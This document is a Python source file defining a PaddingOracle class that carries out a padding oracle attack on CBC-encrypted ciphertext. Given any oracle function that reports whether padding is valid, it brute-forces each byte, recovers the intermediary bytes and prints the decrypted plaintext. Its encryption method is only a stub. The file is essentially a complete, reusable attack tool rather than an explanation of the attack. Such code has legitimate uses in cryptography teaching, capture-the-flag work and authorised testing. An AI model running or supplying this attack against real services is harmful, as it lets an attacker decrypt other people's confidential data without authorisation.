class PaddingOracle:
    def __init__(self, ciphertext: bytes, oracle: callable, blockSize=16):
        self.ciphertext = ciphertext
        self.oracle = oracle
        self.blockSize = blockSize

    def decrypt(self):                  # Function that calls the _paddingOracle function and uses its output to decrypt the message
        print("[*] Starting padding oracle attack")
        print(f"[*] Ciphertext: {self.ciphertext.hex()}")
        intermediary = self._paddingOracle()
        print(' '*100, end='\r')
        print("[*] Attack complete")
        print(f"[*] Decrypted ciphertext: {self._xorBytes(intermediary, self.ciphertext[:-(self.blockSize)])}")

    def encrypt(self, plaintext):       # Will be a function that uses the output of _paddingOracle to encrypt messages. Not yet implemented.
        print(f"will encrypt '{plaintext}' using ciphertext '{self.ciphertext}'. Not yet implemented.")
    
    def _paddingOracle(self):           # The function that performs the attack. Not meant to be called alone, but can be if you only want the intermediary bytes.
        blocks = [self.ciphertext[i:i+self.blockSize] for i in range(0,len(self.ciphertext),self.blockSize)]
        intermediaryBytes = b''

        # The following is a loop through the blocks, then a loop through every position in each block, then a loop through every possible byte value
        for blockIndex,_ in enumerate(blocks[:-1]):
            currentIntermediaryBytes = b''
            for byte in range(self.blockSize):
                for value in range(256):
                    modifiedBlock = blocks[len(blocks)-(blockIndex+2)][:-(byte+1)] + bytes([value]) + self._xorBytes(currentIntermediaryBytes,(byte+1))
                    payload = b''.join([i for i in blocks[:-(blockIndex+2)]] + [modifiedBlock] + [blocks[len(blocks)-(blockIndex+1)]])
                    isPaddedCorrectly = self.oracle(payload)
                    if isPaddedCorrectly and value != blocks[len(blocks)-(blockIndex+2)][-(byte+1)]: # Makes sure that the discovered byte is not equal to the byte same byte as in the original ciphertext
                        currentIntermediaryBytes = self._xorBytes(bytes([value]), (byte+1)) + currentIntermediaryBytes
                        break
                if len(currentIntermediaryBytes) <= byte: # If no byte was discovered, then use the byte from the original ciphertext
                    currentIntermediaryBytes = self._xorBytes(bytes([blocks[len(blocks)-(blockIndex+2)][-(byte+1)]]), (byte+1)) + currentIntermediaryBytes
                print(' '*100, end='\r')
                print(f"[*] Block {blockIndex+1}/{len(blocks[:-1])}, {round(len(currentIntermediaryBytes + intermediaryBytes) / (len(self.ciphertext)-self.blockSize) * 100, 2)}%", end="\r")
            intermediaryBytes = currentIntermediaryBytes + intermediaryBytes
        return intermediaryBytes

    def _xorBytes(self, a, b) -> bytes: # XOR function used in _paddingOracle. Can XOR bytestring with int, or bytestring with bytestring.
        if type(b) == type(42):
            return b''.join([bytes([i ^ b]) for i in a])
        else:
            return bytes(x ^ y for x, y in zip(a, b))

